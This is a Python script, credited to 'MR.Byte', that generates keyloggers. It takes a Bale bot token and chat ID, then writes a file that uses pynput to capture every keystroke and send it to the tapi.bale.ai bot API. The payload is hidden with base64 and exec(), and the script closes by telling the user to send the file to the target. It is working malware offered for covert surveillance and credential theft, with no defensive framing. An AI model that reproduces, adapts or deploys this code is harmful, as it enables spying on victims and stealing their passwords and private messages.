#!/usr/bin/env python3
from colorama import Fore
from time import sleep
import base64
import os

print("")
sleep(1)
os.system("clear" or "cls")
print("")

bnr = Fore.LIGHTGREEN_EX + f"""
    ╔══════════════════════════════════════╗
    ║   ◆ K E Y L O G G E R   S T O R E ◆║
    ╠══════════════════════════════════════╣
    ║  [.] Invisible Eye                 ║
    ║  [√] Active Session                ║
    ║                                    ║
    ║  Coder : MR.Byte                   ║
    ║  Git   : github.com/hellobytecodes      ║
    ╚══════════════════════════════════════╝
   .-'''-..       ..-'''-.
  '   _      ````     _   '
 /    ^              ^    \\
;  .---.            .---.  ;
; (  ◉  )          (  ◉  )  ;
;  `---'            `---'  ;
 \\   /                \\   /
  `~'                  `~'
"""
print(bnr, end="")
print("")
name_file = input(Fore.LIGHTYELLOW_EX + "Choose the keylogger file name with the extension (.py): ")
print("")
token = input(Fore.LIGHTYELLOW_EX + "TOKEN : " + Fore.LIGHTMAGENTA_EX)
chat_id = input(Fore.LIGHTYELLOW_EX + "ID : " + Fore.LIGHTMAGENTA_EX)

create_file = f'''import requests
from pynput import keyboard

TOKEN = "{token}"
CHAT_ID = "{chat_id}"

def key_log(key):
    try:
        if hasattr(key, 'char'):
            text = key.char
        else:
            text = " [" + str(key) + "] "
        url = f"https://tapi.bale.ai/bot{{TOKEN}}/sendMessage"
        requests.post(url, json={{"chat_id": CHAT_ID, "text": text}}, timeout=3)
    except:
        pass

with keyboard.Listener(on_press=key_log) as listener:
    listener.join()
'''

encoded = base64.b64encode(create_file.encode()).decode()
final_code = f'''import base64
exec(base64.b64decode("{encoded}").decode())
'''

with open(name_file, "w", encoding="utf-8") as f:
    f.write(final_code)

sleep(2)
print("")
print(Fore.LIGHTGREEN_EX + "[ Created " + name_file + " Successfully ]")
sleep(0.5)
print(Fore.LIGHTGREEN_EX + "[ Now send the file to the target. ]")
